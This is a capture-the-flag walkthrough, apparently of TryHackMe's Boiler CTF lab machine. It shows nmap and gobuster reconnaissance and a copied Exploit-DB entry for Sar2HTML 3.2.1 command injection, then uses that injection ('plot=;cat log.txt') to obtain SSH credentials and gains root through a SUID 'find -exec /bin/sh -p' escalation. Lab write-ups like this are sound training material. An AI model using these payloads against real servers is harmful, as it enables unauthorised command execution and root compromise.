BOILER CTF 


ENUMERATION 

NMAP

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/BOILER_CTF]
└─$ sudo nmap -sS -sV -A  10.10.36.155  -oN nmap.txt
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 06:23 EST
Nmap scan report for 10.10.36.155
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.61.80
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  ssl/http MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Vulnerable
| Not valid before: 2019-08-22T09:22:57
|_Not valid after:  2024-08-20T09:22:57
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/25%OT=21%CT=1%CU=38887%PV=Y%DS=2%DC=T%G=Y%TM=6218BC7
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   167.65 ms 10.11.0.1
2   168.51 ms 10.10.36.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.73 seconds


"""

FTP DIDNOT GIVE US ANY USEFULL THING



GOBUSTER

"""
                                                                                  
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/BOILER_CTF]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.36.155/             
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.155/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/25 06:25:30 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 11321]
/joomla               (Status: 301) [Size: 313] [--> http://10.10.36.155/joomla/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.36.155/manual/]
/robots.txt           (Status: 200) [Size: 257]                                  
/server-status        (Status: 403) [Size: 300]                                  
                                                                                 
===============================================================
2022/02/25 06:26:53 Finished
===============================================================


"""



FOUND JOOMLA AND 

A WIREDSTRING 


""
079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
""
ASCI STRING TO BASE 64 AFTER THAT DECODE BASE 64 we get

99b0660cd95adea327c54182baa51584


WAS A RABBIT HOLE 

"""
Found : kidding
(hash = 99b0660cd95adea327c54182baa51584)

"""

SCAN JOOMLA :


"""

                                                                                                                                                                      
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/BOILER_CTF]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.36.155/joomla/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.155/joomla/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/25 06:32:46 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 298]
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 303]
/_archive             (Status: 301) [Size: 322] [--> http://10.10.36.155/joomla/_archive/]
/_database            (Status: 301) [Size: 323] [--> http://10.10.36.155/joomla/_database/]
/_files               (Status: 301) [Size: 320] [--> http://10.10.36.155/joomla/_files/]   
/_test                (Status: 301) [Size: 319] [--> http://10.10.36.155/joomla/_test/]    
/~www                 (Status: 301) [Size: 318] [--> http://10.10.36.155/joomla/~www/]     
/administrator        (Status: 301) [Size: 327] [--> http://10.10.36.155/joomla/administrator/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.36.155/joomla/bin/]          
/build                (Status: 301) [Size: 319] [--> http://10.10.36.155/joomla/build/]        
/cache                (Status: 301) [Size: 319] [--> http://10.10.36.155/joomla/cache/]        
/components           (Status: 301) [Size: 324] [--> http://10.10.36.155/joomla/components/]   
/images               (Status: 301) [Size: 320] [--> http://10.10.36.155/joomla/images/]       
/includes             (Status: 301) [Size: 322] [--> http://10.10.36.155/joomla/includes/]     
/index.php            (Status: 200) [Size: 12478]                                              
/installation         (Status: 301) [Size: 326] [--> http://10.10.36.155/joomla/installation/] 
/language             (Status: 301) [Size: 322] [--> http://10.10.36.155/joomla/language/]     
/layouts              (Status: 301) [Size: 321] [--> http://10.10.36.155/joomla/layouts/]      
/libraries            (Status: 301) [Size: 323] [--> http://10.10.36.155/joomla/libraries/]    
/media                (Status: 301) [Size: 319] [--> http://10.10.36.155/joomla/media/]        
/modules              (Status: 301) [Size: 321] [--> http://10.10.36.155/joomla/modules/]      
/plugins              (Status: 301) [Size: 321] [--> http://10.10.36.155/joomla/plugins/]      
/templates            (Status: 301) [Size: 323] [--> http://10.10.36.155/joomla/templates/]    
/tests                (Status: 301) [Size: 319] [--> http://10.10.36.155/joomla/tests/]        
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.36.155/joomla/tmp/]          
                                                                                               
===============================================================
2022/02/25 06:34:07 Finished
===============================================================
                                                                      


"""

LETS FIND thE JOOMLA VErSION with metasploit

"""

msf6 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.18 (Ubuntu)
[+] Joomla version: 3.9.12-dev
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

"""


LETs DO A SEARCH SPLOIT


NO  LUCK

LETS ENUMERATE FURTHEr

FOUND A LOGIN PAGE AT PORT 10000

"""
https://10.10.36.155:10000/

SEAMS TO BE A WEBMIN SERVER IS RUNNING

"""


LETS RUN ANOTHER NMAP SCAN 

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/BOILER_CTF]
└─$ sudo nmap -sS -sV -A -p 55007 10.10.36.155
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 07:58 EST
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.62% done; ETC: 07:58 (0:00:00 remaining)
Nmap scan report for 10.10.36.155
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 55007/tcp)
HOP RTT       ADDRESS
1   168.91 ms 10.11.0.1
2   169.29 ms 10.10.36.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds


"""

only different directory is /-test

found sar2html exploit 
"""


 Exploit Database
Exploit Database

    Exploits

    GHDB

    Papers

    Shellcodes

    Search EDB

    SearchSploit Manual

    Submissions

    Online Training

Exploit Database

Sar2HTML 3.2.1 - Remote Command Execution
EDB-ID:
47204
CVE:
N/A

EDB Verified:
Author:
Cemal Cihad ÇİFTÇİ
Type:
webapps

Exploit:   /  
Platform:
PHP
Date:
2019-08-02

Vulnerable App:

# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://10.10.36.155/index.php?plot=;ls will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
            

"""

exploitation 

http://10.10.36.155/joomla/_test/index.php?plot=;cat%20log.txt


found username =basterd
password = superduperp@$$

LOGIN SSH

FIND OTHER USER PASS AND NAME IN BACKUP.sh

find .secret in other user

PRIVESC:

"""

$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=1001(basterd) gid=1001(basterd) euid=0(root) groups=1001(basterd)
# whoami
root
# cd root
/bin/sh: 3: cd: can't cd to root
# pwd
/tmp
# cd ..
# ls
bin  boot  dev  etc  home  initrd.img  lib  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  webmin-setup.out
# cd root
# ls
root.txt
# cat root.txt
It wasn't that hard, was it?
# 

"""

/usr/bin/find . -exec /bin/sh -p \; -quit

